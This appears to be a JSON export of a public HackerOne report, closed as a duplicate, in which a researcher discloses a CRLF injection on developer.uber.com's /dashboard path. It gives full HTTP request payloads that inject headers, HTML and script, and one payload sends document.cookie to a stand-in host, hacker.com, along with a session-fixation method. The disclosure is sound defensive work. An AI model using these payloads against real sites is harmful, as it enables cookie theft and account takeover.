{"id":125984,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU5ODQ=","url":"https://hackerone.com/reports/125984","title":"CRLF Injection in developer.uber.com","state":"Closed","substate":"duplicate","readable_substate":"Duplicate","created_at":"2016-03-25T15:46:23.321Z","submitted_at":"2016-03-25T15:46:23.321Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kirit1193","url":"/kirit1193","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/062/556/530551ba8476a675430c0eb7c2d61e4553c681f3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-05-09T22:38:57.487Z","bug_reporter_agreed_on_going_public_at":"2016-04-11T06:49:53.955Z","team_member_agreed_on_going_public_at":"2016-05-09T22:38:57.408Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The website located at https://developer.uber.com/ suffers from **CRLF injection**. This allows me to **inject JavaScript, HTML as well as arbitrary HTTP Headers**. Besides this, I can change the HTTP Response code as well, to display whatever I want in the victim's browser.\n\nThe vulnerability resides in the path https://developer.uber.com/dashboard\n\nPlease note that navigating to this website as is, without logging in will give a 302 redirect to the login page. However, if we can send the following HTTP Request:\n\n```\nGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Ealert(\"Injected js\")%3C/script%3E%0d%0a%0d%0a\u003c!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n```\n\n\nThe HTTP Response contains the injected HTTP Headers and the Cookie!\n\nSo apparently, the Web Application Server parses the current path of the web application (Which in this case is /dashboard) and just appends it to the Location header. So if we change the \"Location\" i.e. */dashboard/* to */dashboard/%0d%0aHeader: Random*, then in the HTTP Response, the *%0d%0a* will create a new line following by a new header, *\"Header: Random\".*\n\nHence using injected Line breaks (CRLFs), we are able to add new HTTP Headers and content.\n\nThe Response is as follows:\n\n```\nHTTP/1.1 302 Moved Temporarily\nServer: nginx\nDate: Fri, 25 Mar 2016 15:17:54 GMT\nContent-Type: text/html\nContent-Length: 154\nLocation: https://developer.uber.com/dashboard/\nContent-Type: text/html\nHTTP/1.1 200 OK\nSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"\n\n\u003chtml\u003eHacker Content\u003c/html\u003e\n\n\u003cscript\u003ealert(\"Injected js\")\u003c/script\u003e\n\n\u003c!--\nConnection: close\nSet-Cookie: oauth2_sid=deleted; path=/; Expires=Thu, 01-Jan-1970 00:00:01 GMT\nStrict-Transport-Security: max-age=0\nX-XSS-Protection: 1; mode=block\nCache-Control: max-age=0\n\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003e302 Found\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ccenter\u003e\u003ch1\u003e302 Found\u003c/h1\u003e\u003c/center\u003e\n\u003chr\u003e\u003ccenter\u003enginx\u003c/center\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n\nAs is evident from the Response, both the HTML and Javascript injections work. The first image screenshot of the HTTP Response Render. The rendering of the JavaScript makes this a **Cross-Site Scripting vulnerability** as well, and since the cookies aren't \"Secure\" and \"HttpOnly\" (bugs which aren't allowed in the bounty! ;]), they can easily be extracted by JavaScript and POSTed to my server, making it a **Cookie Stealing** vulnerability as well. Using this HTTP Request:\n\n\n```\nGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Evar+img=new+Image();img.src=\"http://www.hacker.com/incoming.php?coo=\"%20+%20document.cookie;%3C/script%3E%0d%0a%0d%0a\u003c!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n```\n\n\nFinally, the setting of arbitrary Cookies also renders the Web Application to a **Session Fixation** vulnerability, wherein, I can set an arbitrary cookie in the GET request and wait for the victim to click on the link and login. In this case, the cookie which I've set will then identify the victim's account. Using the same cookie in my browser will authenticate the attacker to his account as well.","vulnerability_information_html":"\u003cp\u003eThe website located at \u003ca title=\"https://developer.uber.com/\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.uber.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e suffers from \u003cstrong\u003eCRLF injection\u003c/strong\u003e. This allows me to \u003cstrong\u003einject JavaScript, HTML as well as arbitrary HTTP Headers\u003c/strong\u003e. Besides this, I can change the HTTP Response code as well, to display whatever I want in the victim\u0026#39;s browser.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability resides in the path \u003ca title=\"https://developer.uber.com/dashboard\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.uber.com%2Fdashboard\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.uber.com/dashboard\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ePlease note that navigating to this website as is, without logging in will give a 302 redirect to the login page. However, if we can send the following HTTP Request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\u0026quot;r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\u0026quot;%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Ealert(\u0026quot;Injected js\u0026quot;)%3C/script%3E%0d%0a%0d%0a\u0026lt;!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe HTTP Response contains the injected HTTP Headers and the Cookie!\u003c/p\u003e\n\n\u003cp\u003eSo apparently, the Web Application Server parses the current path of the web application (Which in this case is /dashboard) and just appends it to the Location header. So if we change the \u0026quot;Location\u0026quot; i.e. \u003cem\u003e/dashboard/\u003c/em\u003e to \u003cem\u003e/dashboard/%0d%0aHeader: Random\u003c/em\u003e, then in the HTTP Response, the \u003cem\u003e%0d%0a\u003c/em\u003e will create a new line following by a new header, \u003cem\u003e\u0026quot;Header: Random\u0026quot;.\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eHence using injected Line breaks (CRLFs), we are able to add new HTTP Headers and content.\u003c/p\u003e\n\n\u003cp\u003eThe Response is as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eHTTP/1.1 302 Moved Temporarily\nServer: nginx\nDate: Fri, 25 Mar 2016 15:17:54 GMT\nContent-Type: text/html\nContent-Length: 154\nLocation: https://developer.uber.com/dashboard/\nContent-Type: text/html\nHTTP/1.1 200 OK\nSet-Cookie: oauth2_sid=\u0026quot;r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\u0026quot;\n\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003eHacker Content\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eInjected js\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e\u0026lt;!--\nConnection: close\nSet-Cookie: oauth2_sid=deleted; path=/; Expires=Thu, 01-Jan-1970 00:00:01 GMT\nStrict-Transport-Security: max-age=0\nX-XSS-Protection: 1; mode=block\nCache-Control: max-age=0\n\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\n\u0026lt;body bgcolor=\u0026quot;white\u0026quot;\u0026gt;\n\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;302 Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\n\u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs is evident from the Response, both the HTML and Javascript injections work. The first image screenshot of the HTTP Response Render. The rendering of the JavaScript makes this a \u003cstrong\u003eCross-Site Scripting vulnerability\u003c/strong\u003e as well, and since the cookies aren\u0026#39;t \u0026quot;Secure\u0026quot; and \u0026quot;HttpOnly\u0026quot; (bugs which aren\u0026#39;t allowed in the bounty! ;]), they can easily be extracted by JavaScript and POSTed to my server, making it a \u003cstrong\u003eCookie Stealing\u003c/strong\u003e vulnerability as well. Using this HTTP Request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\u0026quot;r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\u0026quot;%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Evar+img=new+Image();img.src=\u0026quot;http://www.hacker.com/incoming.php?coo=\u0026quot;%20+%20document.cookie;%3C/script%3E%0d%0a%0d%0a\u0026lt;!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFinally, the setting of arbitrary Cookies also renders the Web Application to a \u003cstrong\u003eSession Fixation\u003c/strong\u003e vulnerability, wherein, I can set an arbitrary cookie in the GET request and wait for the victim to click on the link and login. In this case, the cookie which I\u0026#39;ve set will then identify the victim\u0026#39;s account. Using the same cookie in my browser will authenticate the attacker to his account as well.\u003c/p\u003e\n","original_report_id":125159,"original_report_url":"https://hackerone.com/reports/125159","attachments":[{"id":81285,"file_name":"Uber.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/285/a4123a465453e8249a62da4b1de2deb8bf98f27f/Uber.jpg?response-content-disposition=attachment%3B%20filename%3D%22Uber.jpg%22%3B%20filename%2A%3DUTF-8%27%27Uber.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7CRG7HV6%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042249Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDL%2Fh5fBqFuBTrSaxf4ul00epLofNZKIzXDvPOgqBem3gIgF5Ifd19unBAIXFVhlAdK7Dz%2BXRueBIEefq1h8PnVNUcqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDHq1f4SdtjvvsqEDkiqRA6wce2S%2BY%2BLnEHDBgCnsZfUbiPKecdoCmcNJUJqqppT5i9J8dP%2F2fba5bYABF8ZuzkHl4XJSnFH2owLOqvZ1TrltwAFuY4ncs1Jr6E5dk03Cb7kVB6l0qyffs%2BzhlEPNEglLW14kNtVd7%2FPlxYT3WTnqlpN9WNxZVTKe6nHnIA2rEKe3kzpe7Uj8z2MAyKCT0U3otOG%2BlWHdtt5ig9bMR3SNjGFolrk38P9HhFFgDOcoWubRFYuIxY3W9QlpK6WwMtceMKB2rKybcLy%2FCu7FY6od5U0wD%2BrVaoG8o0hkLqjelXnmG%2BwaXNSJ0zWeBpSbvMIsGklaxmLdMs%2FWfhNO5hltzjw9S8JmXHM5mnEGgpOeyY55xS%2FRF4KXm2vq7P0xIG0N1uySOZyyBiaHvnvBLQAO16HibxSCcvFtjxhoLrPbKokc%2FXlEt7qcOw7yxuuSobEGC3W5Kz7%2FI8BtkRZi8d%2BIdr9n1GExy950JM4hMjf2EPY5H1%2FpDtNFNyjy6q77GO7WdZ9HnxIGGy13hwo1rkv3MJKWqv8FOusB54wjFwD3k86QFrRw4z0edoc8DqEBnoRuycpIArk5pjY7Rir50ajFXpxBXlJZLomTmEFRg3z%2Bmy%2FJDhh9LBMOlFzL6Z9QZyJK7IboUJnUHp5evKkvnsL12d%2FlyOgC5GOic698ipYcjcdl3Cqs%2BqI72pfMuKj3OhKGb76diM%2BGzlaRwzVXzgiScmWRSPJqjLuzqm6lg3royiDSJ1ei3ceKA%2FgDJfJt1bkij5egZ49LCsf1z9jhgyxCgp3pr9%2BgxMe4D7zVwkSKse8Z9ZfkjovaOSPqr3fj4zhDDcfkrqqN8%2FIEgCwrpVkjKTRQ%2FA%3D%3D\u0026X-Amz-Signature=0286388b13143e6163b512b294bbcef85796c2b6b18f15d943a48cfc5c512c10","file_size":10653,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2016-05-11T06:49:54.572Z","allow_singular_disclosure_after":-146266374.5040609,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mashoud1122","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":871333,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Thanks for your report.\n\nWe appreciate you taking the time to test Uber. Unfortunately, this issue was already reported by someone else previously, so this will be closed as a duplicate.\n\nThanks and good luck with future bug hunting.","markdown_message":"\u003cp\u003eThanks for your report.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate you taking the time to test Uber. Unfortunately, this issue was already reported by someone else previously, so this will be closed as a duplicate.\u003c/p\u003e\n\n\u003cp\u003eThanks and good luck with future bug hunting.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-25T18:03:21.615Z","updated_at":"2016-03-25T18:03:21.615Z","original_report_id":125159,"actor":{"username":"bugtriage-david","cleared":false,"url":"/bugtriage-david","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":898742,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-11T06:49:54.006Z","updated_at":"2016-04-11T06:49:54.006Z","first_to_agree":true,"actor":{"username":"kirit1193","cleared":false,"url":"/kirit1193","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/062/556/530551ba8476a675430c0eb7c2d61e4553c681f3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935909,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Requesting public disclosure","markdown_message":"\u003cp\u003eRequesting public disclosure\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-02T08:07:55.026Z","updated_at":"2016-05-02T08:07:55.026Z","actor":{"username":"kirit1193","cleared":false,"url":"/kirit1193","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/062/556/530551ba8476a675430c0eb7c2d61e4553c681f3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947979,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure thing!","markdown_message":"\u003cp\u003eSure thing!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-09T22:38:57.436Z","updated_at":"2016-05-09T22:38:57.436Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947980,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-09T22:38:57.515Z","updated_at":"2016-05-09T22:38:57.515Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":949013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-10T16:22:50.997Z","updated_at":"2016-05-10T16:22:50.997Z","actor":{"username":"kirit1193","cleared":false,"url":"/kirit1193","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/062/556/530551ba8476a675430c0eb7c2d61e4553c681f3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}